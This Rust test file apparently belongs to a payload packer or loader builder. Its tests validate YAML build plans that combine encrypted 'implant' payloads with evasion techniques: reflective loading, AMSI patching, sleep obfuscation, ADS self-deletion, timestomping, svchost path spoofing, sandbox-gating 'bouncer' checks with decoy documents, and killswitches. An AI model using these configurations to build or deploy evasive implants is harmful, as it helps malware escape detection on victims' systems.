        "    resources:\n      manifest: {}\n",
        dll_runtime(),
    ));
    let err = validate(&plan).expect_err("expected a validation error");
    assert!(
        err.to_string().contains("process-scoped"),
        "unclear error: {err}"
    );
}

#[test]
fn rejects_a_custom_stub_with_a_dll() {
    let yaml = "schema: 6\nname: t\nbuild:\n  crypto: { algo: xchacha20poly1305, key: random }\n  payloads:\n    p: { source: ./p.exe, format: pe }\n  stub:\n    path: ./s.rs\n  output:\n    path: ./dist/o.dll\n    kind: dll\nruntime:\n  - technique: reflective_loading\n";
    let plan = parse(yaml);
    let err = validate(&plan).expect_err("expected a validation error");
    assert!(
        err.to_string().contains("stub.path"),
        "unclear error: {err}"
    );
}

#[test]
fn rejects_self_deletion_with_a_dll() {
    let plan = parse(&with_dll(
        "",
        "  - technique: self_deletion\n  - technique: reflective_loading\n",
    ));
    let err = validate(&plan).expect_err("expected a validation error");
    assert!(
        err.to_string().contains("self_deletion"),
        "unclear error: {err}"
    );
}

#[test]
fn rejects_sleep_obfuscation_with_a_dll() {
    let plan = parse(&with_dll(
            "",
            "  - technique: sleep_obfuscation\n    params: { sleep_ms: 10 }\n  - technique: reflective_loading\n",
        ));
    let err = validate(&plan).expect_err("expected a validation error");
    assert!(
        err.to_string().contains("encrypts the *running image*"),
        "unclear error: {err}"
    );
}

#[test]
fn rejects_bouncer_exit_with_a_dll() {
    let plan = parse(&with_dll(
            "",
            "  - technique: bouncer\n    params: { require: [{ hostname: host }], on_reject: { action: exit } }\n  - technique: reflective_loading\n",
        ));
    let err = validate(&plan).expect_err("expected a validation error");
    assert!(
        err.to_string().contains("kill the host"),
        "unclear error: {err}"
    );
}

#[test]
fn rejects_erase_pe_header_with_a_dll() {
    let plan = parse(&with_dll(
        "",
        "  - technique: erase_pe_header\n  - technique: reflective_loading\n",
    ));
    let err = validate(&plan).expect_err("the host owns the image");
    assert!(
        err.to_string().contains("erase_pe_header"),
        "unclear error: {err}"
    );
    assert!(err.to_string().contains("host"), "unclear error: {err}");
}

#[test]
fn rejects_erase_pe_header_with_shellcode() {
    let plan = parse(&with_shellcode(
        "    entry: export:Run\n",
        "  - technique: erase_pe_header\n  - technique: reflective_loading\n",
    ));
    let err = validate(&plan).expect_err("the host owns the image");
    assert!(
        err.to_string().contains("erase_pe_header"),
        "unclear error: {err}"
    );
}

#[test]
fn rejects_a_timestomp_without_a_target_in_a_dll() {
    let plan = parse(&with_dll(
            "",
            "  - technique: timestomping\n    params: { reference: 'C:\\Windows\\System32\\kernel32.dll' }\n  - technique: reflective_loading\n",
        ));
    let err = validate(&plan).expect_err("current_exe is the host");
    assert!(
        err.to_string().contains("timestomping"),
        "unclear error: {err}"
    );
    assert!(err.to_string().contains("target"), "unclear error: {err}");
}

#[test]
fn accepts_a_timestomp_with_an_explicit_target_in_a_dll() {
    let plan = parse(&with_dll(
            "",
            "  - technique: timestomping\n    params: { reference: 'C:\\Windows\\System32\\kernel32.dll', target: 'C:\\drop\\x.bin' }\n  - technique: reflective_loading\n",
        ));
    validate(&plan).expect("an explicit target does not touch the host image");
}

#[test]
fn rejects_rust_keywords_as_export_names() {
    for name in ["fn", "self", "crate", "_"] {
        let plan = parse(&with_dll(
            &format!("    entry: export:{name}\n"),
            dll_runtime(),
        ));
        let err = validate(&plan).expect_err("a keyword would not compile");
        assert!(
            err.to_string().contains("Rust keyword"),
            "{name}: unclear error: {err}"
        );
    }
}

// --- killswitch ---

fn with_killswitch(params: &str) -> String {
    with_runtime(&format!(
        "  - technique: killswitch\n    params: {params}\n  - technique: reflective_loading\n"
    ))
}

#[test]
fn accepts_a_valid_killswitch() {
    let plan = parse(&with_killswitch(
        "{ expire_on: '2028-02-29', max_runs: 3, run_key: runs }",
    ));
    validate(&plan).expect("a leap day and a plain file name are valid");
}

#[test]
fn rejects_a_killswitch_date_that_is_not_iso() {
    for date in ["2027/01/01", "2027-1-1", "2027-13-01", "2027-02-30"] {
        let plan = parse(&with_killswitch(&format!("{{ expire_on: '{date}' }}")));
        let err = validate(&plan).expect_err("not an ISO calendar date");
        assert!(
            err.to_string().contains("expire_on"),
            "{date}: unclear error: {err}"
        );
    }
}

#[test]
fn rejects_a_killswitch_run_key_that_escapes_the_temp_directory() {
    for key in ["../escape", "sub/x", "sub\\\\x", "C:\\x", ".."] {
        let plan = parse(&with_killswitch(&format!("{{ run_key: '{key}' }}")));
        let err = validate(&plan).expect_err("a path-like run key");
        assert!(
            err.to_string().contains("run_key"),
            "{key}: unclear error: {err}"
        );
    }
}

#[test]
fn rejects_an_empty_killswitch_run_key() {
    let plan = parse(&with_killswitch("{ run_key: ' ' }"));
    let err = validate(&plan).expect_err("an empty file name");
    assert!(err.to_string().contains("run_key"), "unclear error: {err}");
}

// --- self_deletion ---

fn with_self_deletion(params: &str) -> String {
    with_runtime(&format!(
        "  - technique: self_deletion\n    params: {params}\n  - technique: reflective_loading\n"
    ))
}

#[test]
fn accepts_a_valid_self_deletion_stream() {
    let plan = parse(&with_self_deletion("{ stream: ':hidden' }"));
    validate(&plan).expect("a colon-prefixed stream name is valid");
}

#[test]
fn rejects_a_self_deletion_stream_without_a_colon() {
    let plan = parse(&with_self_deletion("{ stream: hidden }"));
    let err = validate(&plan).expect_err("not a stream name");
    assert!(err.to_string().contains("stream"), "unclear error: {err}");
}

#[test]
fn rejects_a_self_deletion_stream_that_is_only_the_colon() {
    let plan = parse(&with_self_deletion("{ stream: ':' }"));
    let err = validate(&plan).expect_err("an empty stream");
    assert!(err.to_string().contains("stream"), "unclear error: {err}");
}

#[test]
fn rejects_a_self_deletion_stream_with_a_separator() {
    for stream in [":a/b", ":a\\b"] {
        let plan = parse(&with_self_deletion(&format!("{{ stream: '{stream}' }}")));
        let err = validate(&plan).expect_err("a path separator");
        assert!(
            err.to_string().contains("stream"),
            "{stream}: unclear error: {err}"
        );
    }
}

#[test]
fn the_self_deletion_stream_check_is_rename_ads_only() {
    let plan = parse(&with_self_deletion("{ mode: helper, stream: hidden }"));
    validate(&plan).expect("helper mode does not use the stream");
}

#[test]
fn advises_on_self_deletion_after_image_path_spoofing() {
    let plan = parse(&with_runtime(
            "  - technique: image_path_spoofing\n    params: { path: 'C:\\Windows\\System32\\svchost.exe' }\n  - technique: self_deletion\n  - technique: reflective_loading\n",
        ));
    let warnings = advisories(&plan);
    assert!(
        warnings
            .iter()
            .any(|w| w.contains("self_deletion") && w.contains("decoy")),
        "expected a self-deletion advisory: {warnings:?}"
    );
}

// --- bouncer decoy ---

const DECOY_PLAN: &str = "schema: 6\nname: t\nbuild:\n  crypto: { algo: xchacha20poly1305, key: random }\n  payloads:\n    implant: { source: ./p.exe, format: pe }\n    doc: { source: ./d.bin, format: FORMAT }\n  output: { path: ./dist/o.exe, arch: x64, strip: true, trim_paths: all }\nruntime:\n  - technique: bouncer\n    params: { require: [{ hostname: h }], on_reject: { action: decoy, decoy: { path: x, payload: doc } } }\n  - technique: reflective_loading\n    params: { payload: implant }\n";

#[test]
fn accepts_a_plain_bouncer_decoy() {
    let plan = parse(&DECOY_PLAN.replace("FORMAT", "plain"));
    validate(&plan).expect("a format: plain decoy is valid");
}

#[test]
fn rejects_a_bouncer_decoy_that_is_not_plain() {
    let plan = parse(&DECOY_PLAN.replace("FORMAT", "pe"));
    let err = validate(&plan).expect_err("a non-plain decoy");
    assert!(err.to_string().contains("format: plain"), "unclear: {err}");
}

#[test]
fn a_bouncer_decoy_without_a_payload_is_rejected() {
    let plan = parse(&with_runtime(
            "  - technique: bouncer\n    params: { require: [{ hostname: h }], on_reject: { action: decoy } }\n  - technique: reflective_loading\n",
        ));
    let err = validate(&plan).expect_err("decoy without a payload");
    assert!(err.to_string().contains("decoy"), "unclear: {err}");
}

// --- drop ---

const DROP_PLAN: &str = "schema: 6\nname: t\nbuild:\n  crypto: { algo: xchacha20poly1305, key: random }\n  payloads:\n    implant: { source: ./p.exe, format: pe }\n    doc: { source: ./d.bin, format: FORMAT }\n  output: { path: ./dist/o.exe, arch: x64, strip: true, trim_paths: all }\nruntime:\n  - technique: drop\n    params: { path: \"TEST.docx\", payload: doc }\n  - technique: reflective_loading\n    params: { payload: implant }\n";

#[test]
fn accepts_a_plain_drop_asset() {
    validate(&parse(&DROP_PLAN.replace("FORMAT", "plain"))).expect("valid");
}

#[test]
fn rejects_a_drop_asset_that_is_not_plain() {
    let err = validate(&parse(&DROP_PLAN.replace("FORMAT", "pe"))).expect_err("non-plain");
    assert!(err.to_string().contains("format: plain"), "unclear: {err}");
}

#[test]
fn rejects_a_drop_without_a_payload() {
    let plan = parse(&with_runtime(
        "  - technique: drop\n    params: { path: TEST.docx }\n  - technique: reflective_loading\n",
    ));
    let err = validate(&plan).expect_err("drop without a payload");
    assert!(err.to_string().contains("payload"), "unclear: {err}");
}

#[test]
fn rejects_a_drop_with_an_empty_path() {
    let plan = parse(
        &DROP_PLAN
            .replace("FORMAT", "plain")
            .replace("\"TEST.docx\"", "\"\""),
    );
    let err = validate(&plan).expect_err("empty drop path");
    assert!(err.to_string().contains("params.path"), "unclear: {err}");
}

/// The shape of `full-evasion.yaml`: drop a plain asset, gate on a process,
/// then run the payload — a `kind: dll` build with `reflective_loading`.
#[test]
fn a_drop_bouncer_reflective_pipeline_is_valid() {
    let yaml = "schema: 6\nname: t\nbuild:\n  crypto: { algo: xchacha20poly1305, key: random }\n  payloads:\n    implant: { source: ./p.dll, format: dll, export: Run }\n    doc: { source: ./d.bin, format: plain }\n  output: { path: ./dist/o.dll, kind: dll }\nruntime:\n  - technique: drop\n    params: { path: \"TEST.docx\", payload: doc }\n  - technique: bouncer\n    params: { require: [{ process: { name: calc.exe, state: present } }] }\n  - technique: reflective_loading\n    params: { payload: implant }\n";
    validate(&parse(yaml)).expect("the drop + bouncer + reflective pipeline is valid");
}

#[test]
fn rejects_reflective_loading_of_a_dll_without_an_export() {
    let plan = parse(
            "schema: 6\nname: t\nbuild:\n  crypto: { algo: xchacha20poly1305, key: random }\n  payloads:\n    a: { source: ./a.dll, format: dll }\n  output: { path: ./dist/o.exe, arch: x64, strip: true, trim_paths: all }\nruntime:\n  - technique: reflective_loading\n    params: { payload: a }\n",
        );
    let err = validate(&plan).expect_err("a mapped DLL without an export is a no-op");
    assert!(err.to_string().contains("export"), "unclear: {err}");
}

#[test]
fn rejects_an_entry_declared_on_an_executable() {
    let plan = parse(&plan_yaml("", "    entry: export:Run\n", dll_runtime()));
    let err = validate(&plan).expect_err("expected a validation error");
    assert!(
        err.to_string().contains("only applies to a DLL"),
        "unclear error: {err}"
    );
}

#[test]
fn advises_on_an_auto_entry_and_an_unsigned_dll() {
    let plan = parse(&with_dll("", dll_runtime()));
    let warnings = advisories(&plan);
    assert!(
        warnings.iter().any(|w| w.contains("entry is 'auto'")),
        "expected an entry advisory: {warnings:?}"
    );
    assert!(
        warnings.iter().any(|w| w.contains("build.output.sign")),
        "expected a signing advisory: {warnings:?}"
    );
}

#[test]
fn a_host_specific_signed_dll_has_no_dll_advisory() {
    let plan = parse(&with_dll(
        "    entry: export:Run\n    sign: { mode: lab }\n",
        dll_runtime(),
    ));
    let warnings = advisories(&plan);
    assert!(
        !warnings
            .iter()
            .any(|w| w.contains("entry is 'auto'") || w.contains("build.output.sign")),
        "unexpected advisory: {warnings:?}"
    );
}

#[test]
fn advises_on_patch_amsi_in_a_dll_build() {
    let plan = parse(&with_dll(
        "    entry: export:Run\n    sign: { mode: lab }\n",
        "  - technique: patch_amsi\n  - technique: reflective_loading\n",
    ));
    let warnings = advisories(&plan);
    assert!(
        warnings.iter().any(|w| w.contains("patch_amsi")),
        "expected an AMSI advisory: {warnings:?}"
    );
}

#[test]
fn advises_on_a_32_bit_dll() {
    let plan = parse(&with_dll(
        "    entry: export:Run\n    arch: x86\n    sign: { mode: lab }\n",
        dll_runtime(),
    ));
    let warnings = advisories(&plan);
    assert!(
        warnings.iter().any(|w| w.contains("32-bit")),
        "expected an x86 advisory: {warnings:?}"
    );
}

#[test]
fn advises_on_a_dll_path_without_the_extension() {
    let yaml = "schema: 6\nname: t\nbuild:\n  crypto: { algo: xchacha20poly1305, key: random }\n  payloads:\n    p: { source: ./p.exe, format: pe }\n  output:\n    path: ./dist/o.bin\n    kind: dll\n    entry: export:Run\n    sign: { mode: lab }\nruntime:\n  - technique: reflective_loading\n";
    let plan = parse(yaml);
    let warnings = advisories(&plan);
    assert!(
        warnings.iter().any(|w| w.contains("`.dll`")),
        "expected an extension advisory: {warnings:?}"
    );
}
